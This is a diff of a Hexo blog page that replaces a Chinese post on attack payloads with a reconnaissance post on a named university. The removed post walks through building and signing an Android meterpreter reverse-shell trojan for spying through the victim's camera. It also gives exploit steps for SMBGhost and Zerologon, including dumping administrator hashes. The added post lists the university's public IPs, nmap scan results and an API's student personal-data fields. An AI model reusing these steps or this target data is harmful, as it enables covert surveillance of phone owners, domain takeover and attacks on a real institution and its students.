@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="payload, Hexo">
+    <meta name="keywords" content="ecjtu, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>payload | Hexo</title>
+    <title>ecjtu | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -416,12 +416,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">payload</h1>
+                    <h1 class="description center-align post-title">ecjtu</h1>
                 </div>
             </div>
         </div>
@@ -538,27 +538,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Android/">
-                                <span class="chip bg-color">Android</span>
-                            </a>
-                        
-                            <a href="/tags/Payload/">
-                                <span class="chip bg-color">Payload</span>
+                            <a href="/tags/mysql/">
+                                <span class="chip bg-color">mysql</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/Payload/" class="post-category">
-                                Payload
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -567,28 +554,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-08-18
+                    2020-10-03
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-09-20
+                    2020-10-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    830
+                    359
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    4 Min
+                    1 Min
                 </div>
                 
 
@@ -603,68 +590,11 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#Android payload</p>
-<h2 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h2><p>打开终端，安装ufw防火墙，开启5555端口</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></tbody></table></figure>
-
-<p>生成apk后还需用到一下工具优化:<br>1.keytools (密钥、证书管理工具)<br>2.Jarsigner(jar签名、校验工具)<br>3.Zipalign(APK优化攻击)需安装</p>
-<hr>
-<ul>
-<li>首先使用keytools生成创建证书:</li>
-</ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore apk-trojan-key.keystore -<span class="built_in">alias</span> newbie -keyalg RSA -keysize 1024 -validity 999</span><br></pre></td></tr></tbody></table></figure>
-<p>-v 显示密钥库中的证书详细信息<br>-k eystore 指定密钥库的名称<br>-alias 产生别名<br>-keyalg 指定密钥的算法(默认为DSA)<br>-keysize 指定密钥长度<br>-validity 指定创建的证书有效期多少天(默认90)</p>
-<hr>
-<ul>
-<li><p>然后使用jarsigner进行签名:</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>verbose 签名/验证时输出详细信息</p>
-</li>
-<li><p>sigalg  签名算法的名称</p>
-</li>
-<li><p>digestalg 摘要算法的名称</p>
-</li>
-<li><p>keystore 密钥库位置<br><code>进行签名文件+别名</code></p>
-</li>
-<li><p>使用-verify对文件签名验证</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose newbie.apk</span><br></pre></td></tr></tbody></table></figure>
-
-</li>
-</ul>
-<hr>
-<ul>
-<li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v 4 newbie.apk  newbie1.apk</span><br></pre></td></tr></tbody></table></figure>
-
-</li>
-</ul>
-<hr>
-<h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler //加载攻击模块</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options  //查看需要设置的参数</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></tbody></table></figure>
-
-<p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p>
-<hr>
-<h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | more</span><br></pre></td></tr></tbody></table></figure>
-<hr>
-<h1 id="windows-10-payload-CVE-2020-0796"><a href="#windows-10-payload-CVE-2020-0796" class="headerlink" title="windows 10 payload CVE-2020-0796"></a>windows 10 payload CVE-2020-0796</h1><p>直接拿shell</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> lport 3333</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.188.177  //靶机win10：192.168.188.177,靶机关闭defender防火墙</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
-
-<p>下载<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">POC</a></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip win10IP</span><br></pre></td></tr></tbody></table></figure>
-
-<hr>
-<h1 id="windows-CVE-2020-1472"><a href="#windows-CVE-2020-1472" class="headerlink" title="windows CVE-2020-1472"></a>windows CVE-2020-1472</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p>
-<h2 id="exp地址"><a href="#exp地址" class="headerlink" title="exp地址"></a>exp地址</h2><p>github上的exp进行攻击，exp地址如下：<br><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
-<p>##</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n DESKTOP-1VU9SAK -t 10.10.135.211  //要输入计算机名-n  计算机名  -t  域控ip</span><br><span class="line"></span><br><span class="line">secretsdump.py -no-pass -just-dc 2k12vitcim<span class="variable">$@192</span>.168.139.147 //获取管理员ntlm <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">python zerologon_tester.py OWA2010SP3 10.10.135.211</span><br></pre></td></tr></tbody></table></figure>
-
-<p>wmi获取shell权限</p>
-<hr>
-<p>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a></p>
-<p>windows CVE-2020-1472<br><a target="_blank" rel="noopener" href="https://bbs.secgeeker.net/thread-1579-1-1.html">https://bbs.secgeeker.net/thread-1579-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/13678632.html">https://www.cnblogs.com/Yang34/p/13678632.html</a><br><a target="_blank" rel="noopener" href="http://www.hackdig.com/09/hack-134464.htm">http://www.hackdig.com/09/hack-134464.htm</a></p>
+                <p>202.101.209.157 //企业云盘<br> 202.101.209.187 //<a target="_blank" rel="noopener" href="https://mobile.ecjtu.edu.cn/#/">https://mobile.ecjtu.edu.cn/#/</a>  api接口</p>
+<p>微哨</p>
+<p>202.101.209.222<br>Host is up (0.0075s latency).<br>Not shown: 990 closed ports<br>PORT     STATE    SERVICE<br>22/tcp   filtered ssh<br>135/tcp  filtered msrpc<br>139/tcp  filtered netbios-ssn<br>445/tcp  filtered microsoft-ds<br>1433/tcp filtered ms-sql-s<br>1521/tcp filtered oracle<br>2601/tcp filtered zebra<br>2602/tcp filtered ripd<br>2604/tcp filtered ospfd<br>3306/tcp filtered mysql</p>
+<p> 172.16.13.35<br>Host is up (0.016s latency).<br>Not shown: 977 filtered ports<br>PORT      STATE  SERVICE<br>21/tcp    closed ftp<br>22/tcp    closed ssh<br>23/tcp    closed telnet<br>80/tcp    open   http<br>443/tcp   closed https<br>1433/tcp  open   ms-sql-s<br>1521/tcp  closed oracle<br>3306/tcp  closed mysql<br>3389/tcp  open   ms-wbt-server<br>4001/tcp  closed newoak<br>5033/tcp  closed jtnetd-server<br>7000/tcp  closed afs3-fileserver<br>8080/tcp  closed http-proxy<br>8081/tcp  closed blackice-icecap<br>8082/tcp  closed blackice-alerts<br>8083/tcp  closed us-srv<br>8084/tcp  closed unknown<br>8085/tcp  closed unknown<br>8088/tcp  closed radan-http<br>8888/tcp  closed sun-answerbook<br>9101/tcp  closed jetdirect<br>9500/tcp  open   ismserver<br>10000/tcp closed snet-sensor-mgmt</p>
+<p>name    string    姓名<br>sex    string    性别。boy：男，girl：女<br>photo_live    string    头像图片的url地址<br>mood_words    string    用户签名<br>student_number    string    学工号<br>nick_name    string    昵称<br>organization    string    用户所在各级组织结构名称<br>uid    string    用户的唯一id。<br>identity    string    身份。teacher：老师，student：学生<br>schoolcode    string    学校编码<br>openid    string    openid 普通用户的标识，对当前开发者帐号唯一<br>unionid    string    unionid 用户统一标识。针对一个帐号下的应用，同一用户的unionid是唯一的。<br>schoolname    string    schoolname 学校名称<br>schoolicon_url    string    schoolicon_url 学校logo</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -708,7 +638,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/08/18/payload/">http://yoursite.com/2020/08/18/payload/</a>
+                    <a href="http://yoursite.com/2020/10/03/ecjtu/">http://yoursite.com/2020/10/03/ecjtu/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -746,12 +676,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Android/">
-                                    <span class="chip bg-color">Android</span>
-                                </a>
-                            
-                                <a href="/tags/Payload/">
-                                    <span class="chip bg-color">Payload</span>
+                                <a href="/tags/mysql/">
+                                    <span class="chip bg-color">mysql</span>
                                 </a>
                             
                         </div>
@@ -941,16 +867,64 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/08/18/termux/">
+                <a href="/2020/10/03/ecjtu/">
                     <div class="card-image">
                         
-                        <img src="/images/4.png" class="responsive-img" alt="termux">
+                        <img src="/images/5.jpg" class="responsive-img" alt="ecjtu">
                         
-                        <span class="card-title">termux</span>
+                        <span class="card-title">ecjtu</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            202.101.209.157 //企业云盘 202.101.209.187 //https://mobile.ecjtu.edu.cn/#/  api接口
+微哨
+202.101.209.222Host is up (0.0075s lat
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            q0o0p
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/mysql/">
+                        <span class="chip bg-color">mysql</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/20/privilgeescalation/">
+                    <div class="card-image">
+                        
+                        <img src="/images/2.jpg" class="responsive-img" alt="linux提权">
+                        
+                        <span class="card-title">linux提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -960,9 +934,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -982,43 +956,6 @@
                         <span class="chip bg-color">linux</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/1970/01/01/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>1970-01-01
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            q0o0p
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
